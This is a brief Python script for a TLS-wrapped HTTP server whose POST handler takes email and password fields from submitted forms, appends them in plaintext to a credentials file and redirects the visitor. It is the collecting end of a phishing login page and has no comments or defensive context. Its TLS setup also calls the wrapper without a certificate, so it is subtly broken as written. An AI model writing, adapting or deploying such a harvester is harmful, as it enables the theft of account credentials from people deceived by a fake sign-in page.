import http.server
import socketserver
import urllib.request
import urllib.parse
import ssl

PORT = 8000

class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        post_data = urllib.parse.parse_qs(post_data.decode('utf-8'))

        email = post_data['email'][0]
        password = post_data['password'][0]

        with open('credentials.txt', 'a') as f:
            f.write(f"Email: {email}, Password: {password}\n")

        self.send_response(301)
        self.send_header('Location', '/')
        self.end_headers()

Handler = RequestHandler

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True)
    print(f"Serving at port {PORT}")
    httpd.serve_forever()
